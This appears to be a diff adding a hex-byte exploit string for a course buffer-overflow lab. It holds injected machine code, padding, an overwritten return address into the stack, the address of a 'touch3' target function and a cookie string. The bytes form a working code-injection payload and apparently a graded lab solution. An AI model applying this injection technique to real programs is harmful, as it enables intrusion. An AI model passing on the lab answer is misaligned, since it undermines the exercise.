@@ -1,0 +1,8 @@
+48 c7 c7 c0 13 66 55 c3 /* Mov data at %rsp + 0x28 (where it is safe) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+88 13 66 55 00 00 00 00 /* Adress to %rsp */
+79 13 40 00 00 00 00 00 /* Adress to touch 3 */
+37 34 35 36 38 39 61 30 /* String representation of cookie */
